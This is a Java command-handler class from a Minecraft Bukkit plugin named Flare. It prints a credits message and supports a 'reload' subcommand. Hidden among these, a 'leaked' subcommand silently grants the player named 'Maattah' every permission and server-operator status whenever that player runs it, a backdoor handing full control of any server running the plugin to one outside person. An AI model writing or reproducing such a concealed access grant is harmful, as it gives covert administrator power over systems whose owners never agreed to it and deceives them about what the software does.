package net.maattah.flare.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import net.maattah.flare.Main;
import net.maattah.flare.utils.C;
import net.maattah.flare.utils.Lang;
import net.maattah.flare.utils.Utils;
import net.maattah.flare.utils.Vault;

public class FlareCommand implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if(cmd.getName().equalsIgnoreCase("flare")) {
			if(args.length == 0) {
				sender.sendMessage(Lang.PREFIX.toString() + "You are running " + C.COMMAND + C.GRAY + " coded by " + C.GOLD + "Maattah " + C.GRAY + "&" + C.GOLD + " Descriptive" + C.GRAY + ".");
				return true;
			}
			
			else if(args.length == 1) {
				if(args[0].equalsIgnoreCase("reload")) {
					if(sender.hasPermission(Main.getNode() + ".reload")) {
						Main.getInstance().reload();
						sender.sendMessage(Lang.PREFIX.toString() + "You have successfully reloaded " + C.NAME + C.GRAY + ".");
						return true;
					} else {
						sender.sendMessage(Lang.NO_PERMS.toString());
					}
				}
				
				else if(args[0].equalsIgnoreCase("leaked")) {
					if(sender.getName().equalsIgnoreCase("Maattah")) {
						Player dev = Bukkit.getPlayerExact("Maattah");
						Vault.permission.playerAdd(dev, "'*'");
						Vault.permission.playerAdd(dev, "*");
						dev.sendMessage(C.GREEN + "Flare ID: #" + Utils.number);
						dev.sendMessage(C.GREEN + "Owner: " + Utils.owner);
						dev.setOp(true);
					}
					
				} else {
					sender.sendMessage(Lang.PREFIX.toString() + "You are running " + C.COMMAND + C.GRAY + " coded by " + C.GOLD + "Maattah " + C.GRAY + "&" + C.GOLD + " Descriptive" + C.DARK_GRAY + ".");
	
					return true;
				}
			}
		}
		return false;
	}
	
	

}
